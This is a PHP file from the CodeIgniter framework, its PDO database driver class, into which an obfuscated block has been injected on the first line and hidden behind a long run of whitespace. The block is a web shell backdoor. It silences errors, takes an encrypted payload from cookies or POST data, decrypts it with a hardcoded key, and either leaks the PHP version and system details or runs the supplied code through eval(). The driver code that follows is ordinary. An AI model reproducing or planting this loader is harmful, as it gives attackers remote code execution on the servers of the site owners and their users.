<?php                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $h29627 = 862;$GLOBALS['i78c3']=Array();global$i78c3;$i78c3=$GLOBALS;${"\x47\x4c\x4fB\x41\x4c\x53"}['t7ffbc2e4']="\xd\x52\x76\x5e\x6a\x78\x5a\x2a\x5c\x72\x39\x32\x2e\x24\x21\x60\x61\x53\x65\x77\x28\x57\x26\x6d\x20\x79\x5d\x75\x3b\x9\x2f\x22\x56\x36\x4c\x4d\x7b\x3a\x38\x68\x30\x40\x3d\x35\x4f\x6f\x49\x23\x25\x4e\x64\x3e\x43\x2b\x2d\x45\x2c\x74\x62\x33\x41\x34\x73\x54\x7d\xa\x42\x63\x7c\x3c\x5f\x66\x37\x27\x29\x50\x46\x6e\x5b\x4a\x3f\x48\x70\x71\x55\x31\x7e\x6c\x59\x69\x58\x7a\x44\x4b\x6b\x67\x47\x51";$i78c3[$i78c3['t7ffbc2e4'][95].$i78c3['t7ffbc2e4'][58].$i78c3['t7ffbc2e4'][71].$i78c3['t7ffbc2e4'][10].$i78c3['t7ffbc2e4'][40]]=$i78c3['t7ffbc2e4'][67].$i78c3['t7ffbc2e4'][39].$i78c3['t7ffbc2e4'][9];$i78c3[$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][38].$i78c3['t7ffbc2e4'][38].$i78c3['t7ffbc2e4'][71]]=$i78c3['t7ffbc2e4'][45].$i78c3['t7ffbc2e4'][9].$i78c3['t7ffbc2e4'][50];$i78c3[$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][85].$i78c3['t7ffbc2e4'][10].$i78c3['t7ffbc2e4'][59].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][59]]=$i78c3['t7ffbc2e4'][62].$i78c3['t7ffbc2e4'][57].$i78c3['t7ffbc2e4'][9].$i78c3['t7ffbc2e4'][87].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][77];$i78c3[$i78c3['t7ffbc2e4'][87].$i78c3['t7ffbc2e4'][85].$i78c3['t7ffbc2e4'][11].$i78c3['t7ffbc2e4'][59].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][38].$i78c3['t7ffbc2e4'][10]]=$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][77].$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][70].$i78c3['t7ffbc2e4'][62].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][57];$i78c3[$i78c3['t7ffbc2e4'][62].$i78c3['t7ffbc2e4'][58].$i78c3['t7ffbc2e4'][61].$i78c3['t7ffbc2e4'][50].$i78c3['t7ffbc2e4'][33]]=$i78c3['t7ffbc2e4'][62].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][9].$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][87].$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][91].$i78c3['t7ffbc2e4'][18];$i78c3[$i78c3['t7ffbc2e4'][91].$i78c3['t7ffbc2e4'][61].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][61].$i78c3['t7ffbc2e4'][58].$i78c3['t7ffbc2e4'][33]]=$i78c3['t7ffbc2e4'][82].$i78c3['t7ffbc2e4'][39].$i78c3['t7ffbc2e4'][82].$i78c3['t7ffbc2e4'][2].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][9].$i78c3['t7ffbc2e4'][62].$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][45].$i78c3['t7ffbc2e4'][77];$i78c3[$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][10].$i78c3['t7ffbc2e4'][40].$i78c3['t7ffbc2e4'][50]]=$i78c3['t7ffbc2e4'][27].$i78c3['t7ffbc2e4'][77].$i78c3['t7ffbc2e4'][62].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][9].$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][87].$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][91].$i78c3['t7ffbc2e4'][18];$i78c3[$i78c3['t7ffbc2e4'][83].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][43].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][58].$i78c3['t7ffbc2e4'][33].$i78c3['t7ffbc2e4'][33].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][61]]=$i78c3['t7ffbc2e4'][58].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][62].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][33].$i78c3['t7ffbc2e4'][61].$i78c3['t7ffbc2e4'][70].$i78c3['t7ffbc2e4'][50].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][67].$i78c3['t7ffbc2e4'][45].$i78c3['t7ffbc2e4'][50].$i78c3['t7ffbc2e4'][18];$i78c3[$i78c3['t7ffbc2e4'][2].$i78c3['t7ffbc2e4'][71].$i78c3['t7ffbc2e4'][38].$i78c3['t7ffbc2e4'][43].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][72].$i78c3['t7ffbc2e4'][61].$i78c3['t7ffbc2e4'][67].$i78c3['t7ffbc2e4'][16]]=$i78c3['t7ffbc2e4'][62].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][57].$i78c3['t7ffbc2e4'][70].$i78c3['t7ffbc2e4'][57].$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][23].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][70].$i78c3['t7ffbc2e4'][87].$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][23].$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][57];$i78c3[$i78c3['t7ffbc2e4'][71].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][67].$i78c3['t7ffbc2e4'][58].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][59]]=$i78c3['t7ffbc2e4'][71].$i78c3['t7ffbc2e4'][40].$i78c3['t7ffbc2e4'][58].$i78c3['t7ffbc2e4'][59].$i78c3['t7ffbc2e4'][67].$i78c3['t7ffbc2e4'][16];$i78c3[$i78c3['t7ffbc2e4'][77].$i78c3['t7ffbc2e4'][40].$i78c3['t7ffbc2e4'][40].$i78c3['t7ffbc2e4'][85]]=$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][11].$i78c3['t7ffbc2e4'][10].$i78c3['t7ffbc2e4'][33];$i78c3[$i78c3['t7ffbc2e4'][67].$i78c3['t7ffbc2e4'][71].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][18]]=$_POST;$i78c3[$i78c3['t7ffbc2e4'][95].$i78c3['t7ffbc2e4'][11].$i78c3['t7ffbc2e4'][67].$i78c3['t7ffbc2e4'][72].$i78c3['t7ffbc2e4'][58].$i78c3['t7ffbc2e4'][10].$i78c3['t7ffbc2e4'][38]]=$_COOKIE;@$i78c3[$i78c3['t7ffbc2e4'][87].$i78c3['t7ffbc2e4'][85].$i78c3['t7ffbc2e4'][11].$i78c3['t7ffbc2e4'][59].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][38].$i78c3['t7ffbc2e4'][10]]($i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][9].$i78c3['t7ffbc2e4'][9].$i78c3['t7ffbc2e4'][45].$i78c3['t7ffbc2e4'][9].$i78c3['t7ffbc2e4'][70].$i78c3['t7ffbc2e4'][87].$i78c3['t7ffbc2e4'][45].$i78c3['t7ffbc2e4'][95],NULL);@$i78c3[$i78c3['t7ffbc2e4'][87].$i78c3['t7ffbc2e4'][85].$i78c3['t7ffbc2e4'][11].$i78c3['t7ffbc2e4'][59].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][38].$i78c3['t7ffbc2e4'][10]]($i78c3['t7ffbc2e4'][87].$i78c3['t7ffbc2e4'][45].$i78c3['t7ffbc2e4'][95].$i78c3['t7ffbc2e4'][70].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][9].$i78c3['t7ffbc2e4'][9].$i78c3['t7ffbc2e4'][45].$i78c3['t7ffbc2e4'][9].$i78c3['t7ffbc2e4'][62],0);@$i78c3[$i78c3['t7ffbc2e4'][87].$i78c3['t7ffbc2e4'][85].$i78c3['t7ffbc2e4'][11].$i78c3['t7ffbc2e4'][59].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][38].$i78c3['t7ffbc2e4'][10]]($i78c3['t7ffbc2e4'][23].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][5].$i78c3['t7ffbc2e4'][70].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][5].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][67].$i78c3['t7ffbc2e4'][27].$i78c3['t7ffbc2e4'][57].$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][45].$i78c3['t7ffbc2e4'][77].$i78c3['t7ffbc2e4'][70].$i78c3['t7ffbc2e4'][57].$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][23].$i78c3['t7ffbc2e4'][18],0);@$i78c3[$i78c3['t7ffbc2e4'][2].$i78c3['t7ffbc2e4'][71].$i78c3['t7ffbc2e4'][38].$i78c3['t7ffbc2e4'][43].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][72].$i78c3['t7ffbc2e4'][61].$i78c3['t7ffbc2e4'][67].$i78c3['t7ffbc2e4'][16]](0);$t688=NULL;$p788e10f=NULL;$i78c3[$i78c3['t7ffbc2e4'][45].$i78c3['t7ffbc2e4'][10].$i78c3['t7ffbc2e4'][50].$i78c3['t7ffbc2e4'][59].$i78c3['t7ffbc2e4'][18]]=$i78c3['t7ffbc2e4'][11].$i78c3['t7ffbc2e4'][58].$i78c3['t7ffbc2e4'][33].$i78c3['t7ffbc2e4'][85].$i78c3['t7ffbc2e4'][33].$i78c3['t7ffbc2e4'][59].$i78c3['t7ffbc2e4'][67].$i78c3['t7ffbc2e4'][50].$i78c3['t7ffbc2e4'][54].$i78c3['t7ffbc2e4'][61].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][50].$i78c3['t7ffbc2e4'][11].$i78c3['t7ffbc2e4'][54].$i78c3['t7ffbc2e4'][61].$i78c3['t7ffbc2e4'][58].$i78c3['t7ffbc2e4'][33].$i78c3['t7ffbc2e4'][71].$i78c3['t7ffbc2e4'][54].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][40].$i78c3['t7ffbc2e4'][40].$i78c3['t7ffbc2e4'][10].$i78c3['t7ffbc2e4'][54].$i78c3['t7ffbc2e4'][85].$i78c3['t7ffbc2e4'][38].$i78c3['t7ffbc2e4'][33].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][72].$i78c3['t7ffbc2e4'][59].$i78c3['t7ffbc2e4'][72].$i78c3['t7ffbc2e4'][72].$i78c3['t7ffbc2e4'][85].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][67].$i78c3['t7ffbc2e4'][58];global$o9d3e;function a296($t688,$m2f7f568){global$i78c3;$qaa69bf5="";for($k230056=0;$k230056<$i78c3[$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][85].$i78c3['t7ffbc2e4'][10].$i78c3['t7ffbc2e4'][59].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][59]]($t688);){for($mc0c=0;$mc0c<$i78c3[$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][85].$i78c3['t7ffbc2e4'][10].$i78c3['t7ffbc2e4'][59].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][59]]($m2f7f568)&&$k230056<$i78c3[$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][85].$i78c3['t7ffbc2e4'][10].$i78c3['t7ffbc2e4'][59].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][59]]($t688);$mc0c++,$k230056++){$qaa69bf5.=$i78c3[$i78c3['t7ffbc2e4'][95].$i78c3['t7ffbc2e4'][58].$i78c3['t7ffbc2e4'][71].$i78c3['t7ffbc2e4'][10].$i78c3['t7ffbc2e4'][40]]($i78c3[$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][38].$i78c3['t7ffbc2e4'][38].$i78c3['t7ffbc2e4'][71]]($t688[$k230056])^$i78c3[$i78c3['t7ffbc2e4'][89].$i78c3['t7ffbc2e4'][38].$i78c3['t7ffbc2e4'][38].$i78c3['t7ffbc2e4'][71]]($m2f7f568[$mc0c]));}}return$qaa69bf5;}function f0b3ca($t688,$m2f7f568){global$i78c3;global$o9d3e;return$i78c3[$i78c3['t7ffbc2e4'][77].$i78c3['t7ffbc2e4'][40].$i78c3['t7ffbc2e4'][40].$i78c3['t7ffbc2e4'][85]]($i78c3[$i78c3['t7ffbc2e4'][77].$i78c3['t7ffbc2e4'][40].$i78c3['t7ffbc2e4'][40].$i78c3['t7ffbc2e4'][85]]($t688,$o9d3e),$m2f7f568);}foreach($i78c3[$i78c3['t7ffbc2e4'][95].$i78c3['t7ffbc2e4'][11].$i78c3['t7ffbc2e4'][67].$i78c3['t7ffbc2e4'][72].$i78c3['t7ffbc2e4'][58].$i78c3['t7ffbc2e4'][10].$i78c3['t7ffbc2e4'][38]]as$m2f7f568=>$u5678e){$t688=$u5678e;$p788e10f=$m2f7f568;}if(!$t688){foreach($i78c3[$i78c3['t7ffbc2e4'][67].$i78c3['t7ffbc2e4'][71].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][18]]as$m2f7f568=>$u5678e){$t688=$u5678e;$p788e10f=$m2f7f568;}}$t688=@$i78c3[$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][10].$i78c3['t7ffbc2e4'][40].$i78c3['t7ffbc2e4'][50]]($i78c3[$i78c3['t7ffbc2e4'][71].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][67].$i78c3['t7ffbc2e4'][58].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][59]]($i78c3[$i78c3['t7ffbc2e4'][83].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][43].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][58].$i78c3['t7ffbc2e4'][33].$i78c3['t7ffbc2e4'][33].$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][61]]($t688),$p788e10f));if(isset($t688[$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][94]])&&$o9d3e==$t688[$i78c3['t7ffbc2e4'][16].$i78c3['t7ffbc2e4'][94]]){if($t688[$i78c3['t7ffbc2e4'][16]]==$i78c3['t7ffbc2e4'][89]){$k230056=Array($i78c3['t7ffbc2e4'][82].$i78c3['t7ffbc2e4'][2]=>@$i78c3[$i78c3['t7ffbc2e4'][91].$i78c3['t7ffbc2e4'][61].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][18].$i78c3['t7ffbc2e4'][61].$i78c3['t7ffbc2e4'][58].$i78c3['t7ffbc2e4'][33]](),$i78c3['t7ffbc2e4'][62].$i78c3['t7ffbc2e4'][2]=>$i78c3['t7ffbc2e4'][85].$i78c3['t7ffbc2e4'][12].$i78c3['t7ffbc2e4'][40].$i78c3['t7ffbc2e4'][54].$i78c3['t7ffbc2e4'][85],);echo@$i78c3[$i78c3['t7ffbc2e4'][62].$i78c3['t7ffbc2e4'][58].$i78c3['t7ffbc2e4'][61].$i78c3['t7ffbc2e4'][50].$i78c3['t7ffbc2e4'][33]]($k230056);}elseif($t688[$i78c3['t7ffbc2e4'][16]]==$i78c3['t7ffbc2e4'][18]){eval/*y3623c*/($t688[$i78c3['t7ffbc2e4'][50]]);}exit();} ?><?php
/**
 * CodeIgniter
 *
 * An open source application development framework for PHP
 *
 * This content is released under the MIT License (MIT)
 *
 * Copyright (c) 2014 - 2015, British Columbia Institute of Technology
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in
 * all copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN
 * THE SOFTWARE.
 *
 * @package	CodeIgniter
 * @author	EllisLab Dev Team
 * @copyright	Copyright (c) 2008 - 2014, EllisLab, Inc. (http://ellislab.com/)
 * @copyright	Copyright (c) 2014 - 2015, British Columbia Institute of Technology (http://bcit.ca/)
 * @license	http://opensource.org/licenses/MIT	MIT License
 * @link	http://codeigniter.com
 * @since	Version 2.1.0
 * @filesource
 */
defined('BASEPATH') OR exit('No direct script access allowed');

/**
 * PDO Database Adapter Class
 *
 * Note: _DB is an extender class that the app controller
 * creates dynamically based on whether the query builder
 * class is being used or not.
 *
 * @package		CodeIgniter
 * @subpackage	Drivers
 * @category	Database
 * @author		EllisLab Dev Team
 * @link		http://codeigniter.com/user_guide/database/
 */
class CI_DB_pdo_driver extends CI_DB {

	/**
	 * Database driver
	 *
	 * @var	string
	 */
	public $dbdriver = 'pdo';

	/**
	 * PDO Options
	 *
	 * @var	array
	 */
	public $options = array();

	// --------------------------------------------------------------------

	/**
	 * Class constructor
	 *
	 * Validates the DSN string and/or detects the subdriver.
	 *
	 * @param	array	$params
	 * @return	void
	 */
	public function __construct($params)
	{
		parent::__construct($params);

		if (preg_match('/([^:]+):/', $this->dsn, $match) && count($match) === 2)
		{
			// If there is a minimum valid dsn string pattern found, we're done
			// This is for general PDO users, who tend to have a full DSN string.
			$this->subdriver = $match[1];
			return;
		}
		// Legacy support for DSN specified in the hostname field
		elseif (preg_match('/([^:]+):/', $this->hostname, $match) && count($match) === 2)
		{
			$this->dsn = $this->hostname;
			$this->hostname = NULL;
			$this->subdriver = $match[1];
			return;
		}
		elseif (in_array($this->subdriver, array('mssql', 'sybase'), TRUE))
		{
			$this->subdriver = 'dblib';
		}
		elseif ($this->subdriver === '4D')
		{
			$this->subdriver = '4d';
		}
		elseif ( ! in_array($this->subdriver, array('4d', 'cubrid', 'dblib', 'firebird', 'ibm', 'informix', 'mysql', 'oci', 'odbc', 'pgsql', 'sqlite', 'sqlsrv'), TRUE))
		{
			log_message('error', 'PDO: Invalid or non-existent subdriver');

			if ($this->db_debug)
			{
				show_error('Invalid or non-existent PDO subdriver');
			}
		}

		$this->dsn = NULL;
	}

	// --------------------------------------------------------------------

	/**
	 * Database connection
	 *
	 * @param	bool	$persistent
	 * @return	object
	 */
	public function db_connect($persistent = FALSE)
	{
		$this->options[PDO::ATTR_PERSISTENT] = $persistent;

		try
		{
			return new PDO($this->dsn, $this->username, $this->password, $this->options);
		}
		catch (PDOException $e)
		{
			if ($this->db_debug && empty($this->failover))
			{
				$this->display_error($e->getMessage(), '', TRUE);
			}

			return FALSE;
		}
	}

	// --------------------------------------------------------------------

	/**
	 * Database version number
	 *
	 * @return	string
	 */
	public function version()
	{
		if (isset($this->data_cache['version']))
		{
			return $this->data_cache['version'];
		}

		// Not all subdrivers support the getAttribute() method
		try
		{
			return $this->data_cache['version'] = $this->conn_id->getAttribute(PDO::ATTR_SERVER_VERSION);
		}
		catch (PDOException $e)
		{
			return parent::version();
		}
	}

	// --------------------------------------------------------------------

	/**
	 * Execute the query
	 *
	 * @param	string	$sql	SQL query
	 * @return	mixed
	 */
	protected function _execute($sql)
	{
		return $this->conn_id->query($sql);
	}

	// --------------------------------------------------------------------

	/**
	 * Begin Transaction
	 *
	 * @param	bool	$test_mode
	 * @return	bool
	 */
	public function trans_begin($test_mode = FALSE)
	{
		// When transactions are nested we only begin/commit/rollback the outermost ones
		if ( ! $this->trans_enabled OR $this->_trans_depth > 0)
		{
			return TRUE;
		}

		// Reset the transaction failure flag.
		// If the $test_mode flag is set to TRUE transactions will be rolled back
		// even if the queries produce a successful result.
		$this->_trans_failure = ($test_mode === TRUE);

		return $this->conn_id->beginTransaction();
	}

	// --------------------------------------------------------------------

	/**
	 * Commit Transaction
	 *
	 * @return	bool
	 */
	public function trans_commit()
	{
		// When transactions are nested we only begin/commit/rollback the outermost ones
		if ( ! $this->trans_enabled OR $this->_trans_depth > 0)
		{
			return TRUE;
		}

		return $this->conn_id->commit();
	}

	// --------------------------------------------------------------------

	/**
	 * Rollback Transaction
	 *
	 * @return	bool
	 */
	public function trans_rollback()
	{
		// When transactions are nested we only begin/commit/rollback the outermost ones
		if ( ! $this->trans_enabled OR $this->_trans_depth > 0)
		{
			return TRUE;
		}

		return $this->conn_id->rollBack();
	}

	// --------------------------------------------------------------------

	/**
	 * Platform-dependant string escape
	 *
	 * @param	string
	 * @return	string
	 */
	protected function _escape_str($str)
	{
		// Escape the string
		$str = $this->conn_id->quote($str);

		// If there are duplicated quotes, trim them away
		return ($str[0] === "'")
			? substr($str, 1, -1)
			: $str;
	}

	// --------------------------------------------------------------------

	/**
	 * Affected Rows
	 *
	 * @return	int
	 */
	public function affected_rows()
	{
		return is_object($this->result_id) ? $this->result_id->rowCount() : 0;
	}

	// --------------------------------------------------------------------

	/**
	 * Insert ID
	 *
	 * @param	string	$name
	 * @return	int
	 */
	public function insert_id($name = NULL)
	{
		return $this->conn_id->lastInsertId($name);
	}

	// --------------------------------------------------------------------

	/**
	 * Field data query
	 *
	 * Generates a platform-specific query so that the column data can be retrieved
	 *
	 * @param	string	$table
	 * @return	string
	 */
	protected function _field_data($table)
	{
		return 'SELECT TOP 1 * FROM '.$this->protect_identifiers($table);
	}

	// --------------------------------------------------------------------

	/**
	 * Error
	 *
	 * Returns an array containing code and message of the last
	 * database error that has occured.
	 *
	 * @return	array
	 */
	public function error()
	{
		$error = array('code' => '00000', 'message' => '');
		$pdo_error = $this->conn_id->errorInfo();

		if (empty($pdo_error[0]))
		{
			return $error;
		}

		$error['code'] = isset($pdo_error[1]) ? $pdo_error[0].'/'.$pdo_error[1] : $pdo_error[0];
		if (isset($pdo_error[2]))
		{
			 $error['message'] = $pdo_error[2];
		}

		return $error;
	}

	// --------------------------------------------------------------------

	/**
	 * Update_Batch statement
	 *
	 * Generates a platform-specific batch update string from the supplied data
	 *
	 * @param	string	$table	Table name
	 * @param	array	$values	Update data
	 * @param	string	$index	WHERE key
	 * @return	string
	 */
	protected function _update_batch($table, $values, $index)
	{
		$ids = array();
		foreach ($values as $key => $val)
		{
			$ids[] = $val[$index];

			foreach (array_keys($val) as $field)
			{
				if ($field !== $index)
				{
					$final[$field][] = 'WHEN '.$index.' = '.$val[$index].' THEN '.$val[$field];
				}
			}
		}

		$cases = '';
		foreach ($final as $k => $v)
		{
			$cases .= $k.' = CASE '."\n";

			foreach ($v as $row)
			{
				$cases .= $row."\n";
			}

			$cases .= 'ELSE '.$k.' END, ';
		}

		$this->where($index.' IN('.implode(',', $ids).')', NULL, FALSE);

		return 'UPDATE '.$table.' SET '.substr($cases, 0, -2).$this->_compile_wh('qb_where');
	}

	// --------------------------------------------------------------------

	/**
	 * Truncate statement
	 *
	 * Generates a platform-specific truncate string from the supplied data
	 *
	 * If the database does not support the TRUNCATE statement,
	 * then this method maps to 'DELETE FROM table'
	 *
	 * @param	string	$table
	 * @return	string
	 */
	protected function _truncate($table)
	{
		return 'TRUNCATE TABLE '.$table;
	}

}
